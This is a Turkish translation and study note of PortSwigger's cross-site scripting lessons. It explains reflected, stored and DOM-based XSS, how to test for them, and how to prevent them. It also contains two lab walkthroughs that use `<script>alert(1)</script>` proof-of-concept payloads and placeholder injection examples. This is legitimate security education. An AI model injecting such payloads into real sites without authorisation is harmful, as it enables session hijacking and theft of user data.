---
{"dg-publish":true,"permalink":"/portswigger/xss/"}
---

# Cross-site scripting

Bu bölümde, cross-site scripting'in ne olduğunu açıklayacak, cross-site scripting güvenlik açıklarının farklı çeşitlerini tanımlayacak ve cross-site scripting'i nasıl bulacağımızı ve önleyeceğimizi anlatacağız.


# Cross-site scripting (XSS) nedir?

Cross-site scripting (XSS olarak da bilinir), bir saldırganın kullanıcıların savunmasız bir uygulama ile olan etkileşimlerini ele geçirmesine olanak tanıyan bir web güvenlik açığıdır. Bir saldırganın, farklı web sitelerini birbirinden ayırmak için tasarlanmış olan same origin policy'sini atlatmasına olanak tanır. Cross-site scripting oluşturma güvenlik açıkları normalde bir saldırganın kurban kullanıcı gibi davranmasına, kullanıcının gerçekleştirebildiği herhangi bir eylemi gerçekleştirmesine ve kullanıcının verilerine erişmesine olanak tanır. Kurban kullanıcının uygulama içinde ayrıcalıklı erişimi varsa, saldırgan uygulamanın tüm fonksiyonları ve verileri üzerinde tam kontrol sahibi olabilir.


### XSS nasıl çalışır?

Cross-site scripting, savunmasız bir web sitesini manipüle ederek kullanıcılara malicious JavaScript döndürecek şekilde çalışır. Zararlı kod kurbanın tarayıcısında yürütüldüğünde, saldırgan uygulama ile etkileşimlerini tamamen tehlikeye atabilir

![Pasted image 20250410124446.png](/img/user/resimler/Pasted%20image%2020250410124446.png)


## XSS proof of concept

Çoğu XSS açığını, kendi tarayıcınızın bazı rastgele JavaScript'leri çalıştırmasına neden olan bir payload enjekte ederek doğrulayabilirsiniz. Bu amaçla `alert()` fonksiyonunu kullanmak uzun zamandır yaygın bir uygulamadır çünkü kısa, zararsız ve başarılı bir şekilde çağrıldığında gözden kaçması oldukça zordur. Aslında, XSS laboratuvarlarımızın çoğunu simüle edilmiş bir kurbanın tarayıcısında `alert()` fonksiyonunu çağırarak çözebilirsiniz.

Ne yazık ki, Chrome kullanıyorsanız küçük bir aksaklık var. Sürüm 92'den itibaren (20 Temmuz 2021), cross-origin iframes'lerin `alert()` fonksiyonunu çağırması engellenmiştir. Bunlar daha gelişmiş XSS saldırılarından bazılarını oluşturmak için kullanıldığından, bazen alternatif bir PoC payload kullanmanız gerekebilir. Bu senaryoda `print()` fonksiyonunu öneriyoruz. Bu değişiklik ve `print()` fonksiyonunu neden tercih ettiğimiz hakkında daha fazla bilgi edinmek isterseniz, konuyla ilgili [blog yazımıza](https://portswigger.net/research/alert-is-dead-long-live-print) göz atın.

### XSS saldırılarının türleri nelerdir?

Üç ana XSS saldırısı türü vardır. Bunlar

* Zararlı scriptin mevcut HTTP request'inden geldiği [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting).
* [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), zararlı script web sitesinin veritabanından gelir.
* Güvenlik açığının server-side kodu yerine client-side kodunda bulunduğu [DOM based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting).


### Reflected cross-site scripting

Reflected XSS, cross-site scripting'in en basit çeşididir. Bir uygulama bir HTTP request'indeki verileri aldığında ve bu verileri güvenli olmayan bir şekilde anında response'un içine dahil ettiğinde ortaya çıkar.                         

İşte basit bir reflected XSS güvenlik açığı örneği:

```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```

Uygulama veriler üzerinde başka herhangi bir işlem gerçekleştirmediğinden, bir saldırgan bu tür bir saldırıyı kolayca oluşturabilir:

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
```

Kullanıcı saldırgan tarafından oluşturulan URL'yi ziyaret ederse, saldırganın script'i kullanıcının tarayıcısında, kullanıcının uygulama ile olan session'ı context'inde çalışır. Bu noktada, script kullanıcının erişebildiği herhangi bir eylemi gerçekleştirebilir ve herhangi bir veriyi alabilir.

### Stored cross-site scripting

Stored XSS ( persistent veya second-order XSS olarak da bilinir), bir uygulama güvenilmeyen bir kaynaktan veri aldığında ve bu verileri daha sonraki HTTP response'larına güvenli olmayan bir şekilde dahil ettiğinde ortaya çıkar.

Söz konusu veriler HTTP request'leri aracılığıyla uygulamaya gönderilebilir; örneğin, bir blog gönderisindeki yorumlar, bir sohbet odasındaki kullanıcı takma adları veya bir müşteri siparişindeki iletişim bilgileri. Diğer durumlarda, veriler diğer güvenilmeyen kaynaklardan gelebilir; örneğin, SMTP üzerinden alınan mesajları görüntüleyen bir web posta uygulaması, sosyal medya gönderilerini görüntüleyen bir pazarlama uygulaması veya ağ trafiğinden paket verilerini görüntüleyen bir ağ izleme uygulaması.

Aşağıda stored bir XSS güvenlik açığına basit bir örnek verilmiştir. Bir mesaj panosu uygulaması, kullanıcıların diğer kullanıcılara görüntülenen mesajlar göndermesine olanak tanır:

```html
<p>Hello, this is my message!</p>
```

Uygulama veriler üzerinde başka bir işlem yapmaz, bu nedenle bir saldırgan kolayca diğer kullanıcılara saldıran bir mesaj gönderebilir:

```
<p><script>/* Bad stuff here... */</script></p>
```


### DOM-based cross-site scripting

DOM based XSS (DOM XSS olarak da bilinir), bir uygulama güvenilmeyen bir kaynaktan gelen verileri güvenli olmayan bir şekilde, genellikle verileri DOM'a geri yazarak işleyen bazı client-side JavaScript içerdiğinde ortaya çıkar.

Aşağıdaki örnekte, bir uygulama bir input alanından değeri okumak ve bu değeri HTML içindeki bir element'e yazmak için bazı JavaScript'ler kullanmaktadır:

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

Saldırgan input alanının değerini kontrol edebilirse, kendi script dosyasının yürütülmesine neden olan zararlı bir değeri kolayca oluşturabilir:

```
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

Tipik bir durumda, input alanı, URL query string parametresi gibi HTTP request'inin bir kısmından doldurulur ve saldırganın, reflected XSS ile aynı şekilde kötü niyetli bir URL kullanarak bir saldırı gerçekleştirmesine olanak tanır.


### XSS ne için kullanılabilir?

Bir cross-site scripting güvenlik açığından yararlanan bir saldırgan genellikle şunları yapabilir:

* Hedef kullanıcının kimliğine bürünmek veya onun gibi davranmak.
* Kullanıcının gerçekleştirebildiği herhangi bir eylemi gerçekleştirin.
* Kullanıcının erişebildiği tüm verileri okuyun.
* Kullanıcının oturum açma kimlik bilgilerini ele geçirme.
* Web sitesinde virtual defacement gerçekleştirin.
* Web sitesine truva atı fonksiyonu enjekte edin.


## Impact of XSS vulnerabilities

Bir XSS saldırısının gerçek etkisi genellikle uygulamanın yapısına, fonksiyonelliğine ve verilerine ve ele geçirilen kullanıcının durumuna bağlıdır. Örneğin:

* Tüm kullanıcıların anonim olduğu ve tüm bilgilerin herkese açık olduğu bir brochureware uygulamasında, etki genellikle minimum düzeyde olacaktır.

* Bankacılık işlemleri, e-postalar veya sağlık kayıtları gibi hassas veriler içeren bir uygulamada ise etki genellikle ciddi olacaktır.

* Güvenliği ihlal edilen kullanıcı uygulama içinde yüksek ayrıcalıklara sahipse, etki genellikle kritik olur ve saldırganın savunmasız uygulamanın tam kontrolünü ele geçirmesine ve tüm kullanıcıları ve verilerini tehlikeye atmasına olanak tanır.


### XSS güvenlik açıkları nasıl bulunur ve test edilir

XSS güvenlik açıklarının büyük çoğunluğu Burp Suite'in web güvenlik açığı tarayıcısı kullanılarak hızlı ve güvenilir bir şekilde bulunabilir.

Reflected ve stored XSS için manuel test normalde uygulamadaki her input noktasına bazı basit benzersiz inputların (kısa bir alphanumeric string gibi) gönderilmesini, gönderilen input'un HTTP response'larında döndürüldüğü her konumun tanımlanmasını ve uygun şekilde hazırlanmış input'un rastgele JavaScript çalıştırmak için kullanılıp kullanılamayacağını belirlemek için her konumun ayrı ayrı test edilmesini içerir. Bu şekilde, XSS'nin gerçekleştiği context'i belirleyebilir ve bundan yararlanmak için uygun bir payload seçebilirsiniz.

URL parametrelerinden kaynaklanan DOM tabanlı XSS'yi manuel olarak test etmek de benzer bir süreci içerir: parametreye basit ve benzersiz bir input yerleştirmek, bu input'u DOM'da aramak için tarayıcının geliştirici araçlarını kullanmak ve istismar edilebilir olup olmadığını belirlemek için her konumu test etmek. Ancak, diğer DOM XSS türlerini tespit etmek daha zordur. URL based olmayan inputlardaki (`document.cookie` gibi) veya HTML tabanlı olmayan sink'lerdeki (`setTimeout` gibi) DOM tabanlı güvenlik açıklarını bulmak için JavaScript kodunu incelemenin yerini hiçbir şey tutamaz ve bu da son derece zaman alıcı olabilir. Burp Suite'in web güvenlik açığı tarayıcısı, DOM tabanlı güvenlik açıklarının tespitini güvenilir bir şekilde otomatikleştirmek için JavaScript'in statik ve dinamik analizini birleştirir.


## Content security policy

Content security policy (CSP), cross-site scripting ve diğer bazı güvenlik açıklarının etkisini azaltmayı amaçlayan bir browser mekanizmasıdır. CSP kullanan bir uygulama XSS benzeri davranışlar içeriyorsa, CSP güvenlik açığının kullanılmasını engelleyebilir veya önleyebilir. Çoğu zaman, CSP, altta yatan güvenlik açığının istismar edilmesini sağlamak için atlatılabilir.


## Dangling markup injection

Dangling markup injection, input filtreleri veya diğer savunmalar nedeniyle tam bir cross-site scripting exploit'in mümkün olmadığı durumlarda alanlar arası veri yakalamak için kullanılabilen bir tekniktir. Genellikle, kullanıcı adına yetkisiz eylemler gerçekleştirmek için kullanılabilecek CSRF tokenları da dahil olmak üzere diğer kullanıcılar tarafından görülebilen hassas bilgileri yakalamak için kullanılabilir.


### XSS saldırıları nasıl önlenir

Cross-site scripting'i önlemek bazı durumlarda önemsizdir ancak uygulamanın karmaşıklığına ve kullanıcı tarafından kontrol edilebilen verileri işleme yöntemlerine bağlı olarak çok daha zor olabilir.

Genel olarak, XSS güvenlik açıklarının etkili bir şekilde önlenmesi muhtemelen aşağıdaki önlemlerin bir kombinasyonunu içerecektir:

* İnput'u geldiği anda filtreleyin. Kullanıcı inputunun alındığı noktada, beklenen veya geçerli inputu temel alarak mümkün olduğunca katı bir şekilde filtreleyin.

* Çıktıdaki verileri kodlayın. Kullanıcı tarafından kontrol edilebilen verilerin HTTP response'larında çıktılandığı noktada, etkin content olarak yorumlanmasını önlemek için çıktıyı kodlayın. Output context'ine bağlı olarak bu, HTML, URL, JavaScript ve CSS kodlama kombinasyonlarının uygulanmasını gerektirebilir.

* Uygun response header'ları kullanın. Herhangi bir HTML veya JavaScript içermesi amaçlanmayan HTTP response'larında XSS'yi önlemek için `Content-Type` ve `X-Content-Type-Options` header'larını kullanarak tarayıcıların responseları amaçladığınız şekilde yorumlamasını sağlayabilirsiniz.

* Content Security Policy. Son savunma hattı olarak, yine de ortaya çıkan XSS güvenlik açıklarının şiddetini azaltmak için Content Security Policy (CSP) kullanabilirsiniz.


### Cross-site scripting hakkında sık sorulan sorular

**XSS (Cross-Site Scripting) açıkları ne kadar yaygındır?**  
XSS açıkları oldukça yaygındır ve muhtemelen en sık karşılaşılan web güvenlik zafiyetidir.

**XSS saldırıları ne kadar yaygındır?**  
Gerçek dünyadaki XSS saldırılarına dair güvenilir veriler elde etmek zordur, ancak muhtemelen diğer zafiyetlere kıyasla daha az sıklıkla istismar edilmektedir.

**XSS ile CSRF arasındaki fark nedir?**  
XSS, bir web sitesinin kötü amaçlı JavaScript döndürmesini sağlamayı içerirken; CSRF, kurban kullanıcının istemeden işlem yapmasını sağlamaya yönelik bir saldırıdır.

**XSS ile SQL Injection arasındaki fark nedir?**  
XSS, client-side bir zafiyettir ve diğer uygulama kullanıcılarını hedef alır; SQL Injection ise server-side bir zafiyettir ve uygulamanın veritabanını hedef alır.

**PHP'de XSS nasıl önlenir?**  
İnputları, izin verilen karakterlerin bulunduğu bir whitelist'e filtreleyin ve mümkünse tür ipuçları (type hint) veya tür dönüştürme (type casting) kullanın. HTML içeriğinde çıktılar için `htmlentities` ve `ENT_QUOTES` kullanarak kaçış işlemi yapın; JavaScript içeriği içinse Unicode karakter kaçışlarını (JavaScript Unicode escapes) kullanın.

**Java'da XSS nasıl önlenir?**  
İnput'ları, izin verilen karakterlerden oluşan bir whitelist'le filtreleyin ve HTML çıktıları için Google Guava gibi bir kütüphane kullanarak HTML encode işlemi yapın; JavaScript çıktıları için JavaScript Unicode kaçışlarını kullanın.


# Reflected XSS

Bu bölümde, reflected cross-site scripting dosyasını açıklayacak, reflected XSS saldırılarının etkisini tanımlayacak ve reflected XSS güvenlik açıklarının nasıl bulunacağını anlatacağız.


### Reflected cross-site scripting nedir?

**Reflected XSS**, bir web uygulamasının bir HTTP request içerisinde aldığı veriyi, bu veriyi güvenli olmayan bir şekilde doğrudan HTTP response içerisinde geri döndürmesi durumunda ortaya çıkar.

Örneğin, bir web sitesinde bir search fonksiyonu olduğunu varsayalım ve bu fonksiyon kullanıcıdan gelen search terimini bir URL parametresi olarak alıyor olsun:

```
https://insecure-website.com/search?term=gift
```

Uygulama, sağlanan search terimini bu URL'ye verilen response'da yansıtır:

```
<p>You searched for: gift</p>
```

Uygulamanın veriler üzerinde başka bir işlem yapmadığını varsayarsak, bir saldırgan buna benzer bir saldırı oluşturabilir:

```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

Bu URL aşağıdaki response'la sonuçlanır:

```
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

Uygulamanın başka bir kullanıcısı saldırganın URL'sini talep ederse, saldırgan tarafından sağlanan script dosyası, kurban kullanıcının tarayıcısında, uygulamayla olan session'ı contex'inde çalıştırılacaktır.

---

# Hiçbir karakterin encode edilmediği HTML context içinde Reflected XSS

Bu laboratuvar, search fonksiyonunda reflected cross-site scripting güvenlik açığı içermektedir.

Laboratuvarı çözmek için `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Aşağıdakileri kopyalayın ve search kutusuna yapıştırın:

```
<script>alert(1)</script>
```

![Pasted image 20250410135804.png](/img/user/resimler/Pasted%20image%2020250410135804.png)

2- Click "`Search`".

![Pasted image 20250410135820.png](/img/user/resimler/Pasted%20image%2020250410135820.png)

---

## Reflected XSS saldırılarının etkisi

Bir saldırgan kurbanın tarayıcısında çalıştırılan bir script dosyasını kontrol edebilirse, genellikle o kullanıcıyı tamamen ele geçirebilir. Diğer şeylerin yanı sıra, saldırgan şunları yapabilir:

* Uygulama içinde kullanıcının gerçekleştirebileceği herhangi bir eylemi gerçekleştirin.
* Kullanıcının görüntüleyebildiği tüm bilgileri görüntüleyin.
* Kullanıcının değiştirebildiği tüm bilgileri değiştirin.
* Kötü niyetli saldırılar da dahil olmak üzere diğer uygulama kullanıcılarıyla, ilk kurban kullanıcıdan kaynaklanıyormuş gibi görünen etkileşimler başlatmak.

Bir saldırganın, reflected XSS saldırısı gerçekleştirmek için kurban bir kullanıcıyı kendi kontrolünde olan bir request'de bulunmaya teşvik edebileceği çeşitli yollar vardır. Bunlar arasında saldırgan tarafından kontrol edilen bir web sitesine veya içeriğin oluşturulmasına izin veren başka bir web sitesine bağlantılar yerleştirmek veya bir e-posta, tweet veya başka bir mesajda bir bağlantı göndermek yer alır. Saldırı doğrudan bilinen bir kullanıcıyı hedef alabilir ya da uygulamanın tüm kullanıcılarına karşı gelişigüzel bir saldırı olabilir.

Saldırı için external bir dağıtım mekanizmasına ihtiyaç duyulması, reflected XSS'nin etkisinin genellikle, savunmasız uygulamanın kendi içinde bağımsız bir saldırının gerçekleştirilebildiği stored XSS'den daha az şiddetli olduğu anlamına gelir.


### Farklı contex'lerde Reflected XSS

Reflected cross-site scripting'in birçok farklı çeşidi vardır. Reflect edilen verinin uygulamanın response'u içindeki konumu, bundan yararlanmak için ne tür bir paylaod gerektiğini belirler ve güvenlik açığının etkisini de etkileyebilir.

Buna ek olarak, uygulama reflect edilmeden önce gönderilen veriler üzerinde herhangi bir validation veya başka bir işlem gerçekleştiriyorsa, bu genellikle ne tür bir XSS payload'unun gerekli olduğunu etkileyecektir.


## Reflected XSS güvenlik açıkları nasıl bulunur ve test edilir

Reflected cross-site scripting güvenlik açıklarının büyük çoğunluğu Burp Suite'in web güvenlik açığı tarayıcısı kullanılarak hızlı ve güvenilir bir şekilde bulunabilir.

Reflected XSS güvenlik açıklarını manuel olarak test etmek aşağıdaki adımları içerir:

* Her giriş noktasını test edin. Uygulamanın HTTP request'leri içindeki veriler için her entry noktasını ayrı ayrı test edin. Bu, URL query string ve message body içindeki parametreleri veya diğer verileri ve URL dosya yolunu içerir. Ayrıca HTTP header'larını da içerir, ancak yalnızca belirli HTTP header'ları aracılığıyla tetiklenebilen XSS benzeri davranışlar pratikte istismar edilemeyebilir.

* Rastgele alphanumeric değerler gönderin. Her giriş noktası için benzersiz bir rastgele değer gönderin ve değerin response'a yansıyıp yansımadığını belirleyin. Değer, çoğu giriş doğrulamasından geçecek şekilde tasarlanmalıdır, bu nedenle oldukça kısa olmalı ve yalnızca alphanumeric karakterler içermelidir. Ancak, response içinde kazara eşleşme olasılığını son derece düşük kılacak kadar uzun olması gerekir. Yaklaşık 8 karakterlik rastgele bir alfanümerik değer normalde idealdir. Uygun rastgele değerler oluşturmak için Burp Intruder'ın rastgele oluşturulmuş hex değerlerine sahip [number payload](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/payload-types#numbers)'larını kullanabilirsiniz. Ve gönderilen değeri içeren response'ları otomatik olarak işaretlemek için Burp Intruder'ın grep [payloads ayarlarını](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings#grep-payloads) kullanabilirsiniz.

* Reflection context'i belirleyin. Response içinde rastgele değerin reflected olduğu her konum için context'ini belirleyin. Bu, HTML tagları arasındaki text içinde, quoted olabilecek bir tag attribute içinde, bir JavaScript string içinde vb. olabilir.

* Aday bir payload'ı test edin. Reflectiom context'ine bağlı olarak, response içinde değiştirilmeden yansıtılırsa JavaScript yürütülmesini tetikleyecek ilk aday XSS payload'ını test edin. Payloadları test etmenin en kolay yolu, request'i Burp Repeater'a göndermek, aday payload'ı eklemek için request'i değiştirmek, request'i yayınlamak ve ardından payloadı'ı çalışıp çalışmadığını görmek için response'u incelemektir. Çalışmanın etkili bir yolu, orijinal rastgele değeri request'e bırakmak ve aday XSS payload'unu ondan önce veya sonra yerleştirmektir. Ardından rastgele değeri Burp Repeater'ın response görünümünde search terimi olarak ayarlayın. Burp, search teriminin göründüğü her konumu vurgulayarak yansımayı hızlı bir şekilde bulmanızı sağlayacaktır.

* Alternatif payload'ları test edin. Aday XSS payload'ı uygulama tarafından değiştirildiyse veya tamamen engellendiyse, reflection context'ine ve gerçekleştirilen input doğrulama türüne bağlı olarak çalışan bir XSS saldırısı sunabilecek alternatif payload'ları ve teknikleri test etmeniz gerekecektir. Daha fazla ayrıntı için bkz. [cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)

* Saldırıyı bir browser'da test edin. Son olarak, Burp Repeater içinde çalışıyor gibi görünen bir payload bulmayı başarırsanız, saldırıyı gerçek bir browser'a aktarın (URL'yi address bar'a yapıştırarak ya da [Burp Proxy'nin intercept](https://portswigger.net/burp/documentation/desktop/tools/proxy/intercept-messages) görünümünde request'i değiştirerek) ve enjekte edilen JavaScript'in gerçekten çalıştırılıp çalıştırılmadığına bakın. Genellikle, saldırı başarılı olursa tarayıcıda görünür bir açılır pencereyi tetikleyecek `alert(document.domain)` gibi bazı basit JavaScript'leri çalıştırmak en iyisidir.

## Reflected cross-site scripting hakkında sık sorulan sorular

Reflected XSS ve stored XSS arasındaki fark nedir? Reflected XSS, bir uygulama bir HTTP request'inde bazı input'ları aldığında ve bu input'u güvenli olmayan bir şekilde anında response'a yerleştirdiğinde ortaya çıkar. Stored XSS'de ise uygulama bunun yerine input'a depolar ve daha sonraki bir yanıta güvenli olmayan bir şekilde yerleştirir.

Reflected XSS ile self-XSS arasındaki fark nedir? Self-XSS, normal reflected XSS'ye benzer uygulama davranışı içerir, ancak hazırlanmış bir URL veya cross domain request yoluyla normal yollarla tetiklenemez. Bunun yerine, güvenlik açığı yalnızca kurban XSS payload'ı tarayıcısından kendisi gönderirse tetiklenir. Bir self-XSS saldırısı sunmak normalde kurbanın saldırgan tarafından sağlanan bazı input'ları tarayıcısına yapıştırması için sosyal mühendislik yapılmasını içerir. Bu nedenle, normalde hafif, düşük etkili bir sorun olarak kabul edilir.


# Stored XSS

Bu bölümde, stored cross-site scripting'i açıklayacak, stored XSS saldırılarının etkisini tanımlayacak ve stored XSS güvenlik açıklarının nasıl bulunacağını anlatacağız.


### stored cross-site scripting nedir?

Stored cross-site scripting (second-order veya persistent XSS olarak da bilinir), bir uygulama güvenilmeyen bir kaynaktan veri aldığında ve bu verileri daha sonraki HTTP response'larına güvenli olmayan bir şekilde dahil ettiğinde ortaya çıkar.

Bir web sitesinin kullanıcıların blog yazılarına yorum göndermesine izin verdiğini ve bu yorumların diğer kullanıcılara gösterildiğini varsayalım. Kullanıcılar aşağıdaki gibi bir HTTP request'i kullanarak yorum gönderir:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

Bu yorum gönderildikten sonra, blog gönderisini ziyaret eden herhangi bir kullanıcı, uygulamanın response'u içinde aşağıdakileri alacaktır:

```
<p>This post was extremely helpful.</p>
```

Uygulamanın veriler üzerinde başka bir işlem yapmadığını varsayarsak, bir saldırgan bunun gibi kötü niyetli bir yorum gönderebilir:

```
<script>/* Bad stuff here... */</script>
```

Saldırganın request'inde bu yorum URL ile şu şekilde kodlanacaktır:

```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

Blog gönderisini ziyaret eden herhangi bir kullanıcı artık uygulamanın response'u içinde aşağıdakileri alacaktır:

```
<p><script>/* Bad stuff here... */</script></p>
```

Saldırgan tarafından sağlanan script daha sonra kurban kullanıcının tarayıcısında, uygulama ile olan session'u context'inde çalıştırılacaktır.

----

# Lab: Stored XSS into HTML context with nothing encoded

Bu laboratuvar, yorum fonksiyonunda stored cross-site scripting güvenlik açığı içerir.

Bu laboratuvarı çözmek için blog yazısı görüntülendiğinde `alert` fonksiyonunu çağıran bir yorum gönderin.

Çözüm : 

1- Yorum kutusuna aşağıdakileri girin:

```
<script>alert(1)</script>
```

2-Bir isim, e-posta ve web sitesi girin.

![Pasted image 20250410145856.png](/img/user/resimler/Pasted%20image%2020250410145856.png)

3- “Yorum gönder ”e tıklayın.

4- Bloga geri dönün.

![Pasted image 20250410145910.png](/img/user/resimler/Pasted%20image%2020250410145910.png)

---

## Impact of stored XSS attacks

Bir saldırgan kurbanın tarayıcısında çalıştırılan bir script'i kontrol edebiliyorsa, genellikle o kullanıcıyı tamamen tehlikeye atabilir. Saldırgan, reflected XSS güvenlik açıklarının etkisi için geçerli olan eylemlerden herhangi birini gerçekleştirebilir.

Yararlanılabilirlik açısından, reflekte edilen ve stored XSS arasındaki temel fark, stored XSS güvenlik açığının uygulamanın kendi içinde bulunan saldırılara olanak sağlamasıdır. Saldırganın, diğer kullanıcıları kendi açıklarını içeren belirli bir request'de bulunmaya teşvik etmek için external bir yol bulması gerekmez. Bunun yerine, saldırgan istismarını uygulamanın içine yerleştirir ve kullanıcıların bununla karşılaşmasını bekler.

Stored cross-site scripting exploit'lerinin kendi kendine yeten yapısı, XSS açığının yalnızca o anda uygulamada oturum açmış olan kullanıcıları etkilediği durumlarda özellikle önemlidir. XSS yansıtılıyorsa, saldırının zamanlamasının tesadüfi olması gerekir: oturum açmadığı bir zamanda saldırganın request'ini yapmaya teşvik edilen bir kullanıcı tehlikeye atılmayacaktır. Buna karşılık, XSS saklanırsa, kullanıcının istismarla karşılaştığı anda oturum açmış olması garanti edilir.


# Farklı context'lerde Stored XSS

Stored cross-site scripting'in birçok farklı çeşidi vardır. Depolanan verinin uygulama response'u içindeki konumu, bu veriden faydalanmak için ne tür bir payload gerektiğini belirler ve güvenlik açığının etkisini de etkileyebilir.

Buna ek olarak, uygulama depolanmadan önce veya depolanan verilerin response'ları dahil edildiği noktada veriler üzerinde herhangi bir doğrulama veya başka bir işlem gerçekleştirirse, bu genellikle ne tür bir XSS payload'unun gerekli olduğunu etkileyecektir.


## Stored XSS güvenlik açıkları nasıl bulunur ve test edilir

Birçok **stored XSS** (depolanmış XSS) açığı, **Burp Suite**’in web güvenlik tarayıcısı kullanılarak bulunabilir.

**Stored XSS** açıklarını manuel olarak test etmek zordur. Saldırgan tarafından kontrol edilebilen verilerin uygulamanın işlemine dahil olabileceği tüm **entry point**'leri (giriş noktaları) ve bu verilerin uygulamanın **response**'larında (yanıtlarında) görünebileceği tüm **exit point**'leri (çıkış noktaları) test etmeniz gerekir.

Uygulamanın işlemine giriş sağlayan **entry point**’ler şunlardır:

- URL query string'i ve mesaj body'si içindeki parametreler veya diğer veriler,
    
- URL **file path**,
    
- **HTTP request header**’ları (bunlar genellikle reflected XSS ile sömürülemez olsa da göz önünde bulundurulmalıdır),
    
- Saldırganın uygulamaya veri iletebileceği uygulama dışı diğer yollar. Bu yollar tamamen uygulamanın sunduğu işlevselliğe bağlıdır:
    
    - Bir webmail uygulaması gelen e-postalardaki veriyi işler,

    - Bir Twitter akışı gösteren uygulama üçüncü taraf tweet’lerdeki verileri işler,

    - Bir haber toplayıcı (aggregator) başka web sitelerinden gelen verileri içerebilir.
        

**Stored XSS** saldırılarının **exit point**’leri, herhangi bir kullanıcıya herhangi bir durumda dönen tüm olası **HTTP response**’lardır.

Stored XSS açıklarını test etmenin ilk adımı, bir **entry point**’e gönderilen verinin bir **exit point**’ten çıktığı bağlantıları bulmaktır. Bu adımın zorluğu şu nedenlerden kaynaklanır:

- Bir **entry point**’e gönderilen veri teoride herhangi bir **exit point**’te çıkabilir. Örneğin, kullanıcı tarafından belirlenen bir screen adı sadece belirli kullanıcıların görebileceği bir denetim kaydında (audit log) yer alabilir.
    
- Uygulamada hâlihazırda saklanan veri, uygulama içinde yapılan başka işlemler nedeniyle kolayca **overwrite** edilebilir (üzerine yazılabilir). Örneğin, bir arama fonksiyonu, en son yapılan aramaların listesini gösterebilir, ancak bu liste başka kullanıcıların yeni aramalar yapmasıyla hızla değişebilir.
    

**Entry** ve **exit point**’ler arasındaki tüm bağlantıları kapsamlı bir şekilde belirlemek için her kombinasyonu ayrı ayrı test etmek gerekir. Bu, belirli bir değerin bir giriş noktasına gönderilmesi, doğrudan ilgili çıkış noktasına gidilmesi ve değerin burada görünüp görünmediğinin kontrol edilmesi anlamına gelir. Ancak, birkaç sayfadan fazla içeriğe sahip bir uygulamada bu yöntem pratik değildir.

Bunun yerine daha uygulanabilir bir yöntem, veri giriş noktalarını sistematik olarak test etmek, her birine özel bir değer göndermek ve uygulamanın **response**’larını izleyerek bu değerin nerelerde göründüğünü tespit etmektir. Özellikle blog gönderilerine yapılan yorumlar gibi ilgili uygulama işlevlerine dikkat edilmelidir. Gönderilen değerin bir **response** içinde gözlemlenmesi durumunda, bu verinin gerçekten farklı **request**'ler arasında **stored** edilip edilmediği (saklanıp saklanmadığı), yoksa sadece anlık olarak **reflected** bir şekilde mi döndüğü belirlenmelidir.

Uygulamanın işleminde **entry** ve **exit point** bağlantıları belirlendikten sonra, her bağlantı özel olarak test edilmelidir. Bu, **response** içinde saklanan verinin hangi **context**’te (bağlamda) yer aldığını belirlemeyi ve o bağlama uygun **XSS payload**’larını test etmeyi içerir. Bu noktadan sonra test yöntemi, **reflected XSS** açıklarını bulma süreciyle büyük ölçüde aynıdır.

# DOM-based XSS

Bu bölümde, DOM based cross-site scripting'i (DOM XSS) tanımlayacak, DOM XSS açıklarının nasıl bulunacağını açıklayacak ve DOM XSS'in farklı source ve sink'lerle nasıl exploit edileceğinden bahsedeceğiz.


## DOM-based cross-site scripting nedir?

DOM based XSS güvenlik açıkları genellikle JavaScript URL gibi saldırgan tarafından kontrol edilebilen bir source'dan veri alıp `eval()` veya `innerHTML` gibi dinamik kod yürütmeyi destekleyen bir sink'e aktardığında ortaya çıkar. Bu da saldırganların kötü niyetli JavaScript çalıştırmasına ve genellikle diğer kullanıcıların hesaplarını ele geçirmesine olanak tanır.

DOM-based bir XSS saldırısı gerçekleştirmek için, bir source'a veri yerleştirmeniz gerekir, böylece bu veri bir sink'e yayılır ve keyfi JavaScript'in yürütülmesine neden olur.

DOM XSS için en yaygın source, genellikle `window.location` object'i ile erişilen URL'dir. Bir saldırgan, kurbanı `query string` ve URL'nin `fragment` kısımlarında bir payload ile savunmasız bir sayfaya göndermek için bir bağlantı oluşturabilir. Belirli durumlarda, örneğin bir `404` sayfasını veya PHP çalıştıran bir web sitesini hedeflerken, payload yola da yerleştirilebilir.

Source'lar ve sink'ler arasındaki taint flow'un detaylı bir açıklaması için lütfen DOM-based güvenlik açıkları sayfasına bakınız.


## DOM based cross-site scripting için nasıl test edilir ? 

DOM XSS güvenlik açıklarının çoğu Burp Suite'in web güvenlik açığı tarayıcısı kullanılarak hızlı ve güvenilir bir şekilde bulunabilir. DOM based cross-site scripting'i manuel olarak test etmek için genellikle Chrome gibi developer araçlarına sahip bir tarayıcı kullanmanız gerekir. Mevcut her bir source üzerinde sırayla çalışmanız ve her birini ayrı ayrı test etmeniz gerekir.

### Testing HTML sinks

**DOM XSS**’i bir **HTML sink** içinde test etmek için, örneğin `location.search` gibi bir **source**'a rastgele bir alfasayısal (alphanumeric) string yerleştirin. Ardından tarayıcıdaki geliştirici araçlarını (**Developer Tools**) kullanarak HTML'yi inceleyin ve string’iniz DOM içinde nerelerde görünüyor, bunu belirleyin.

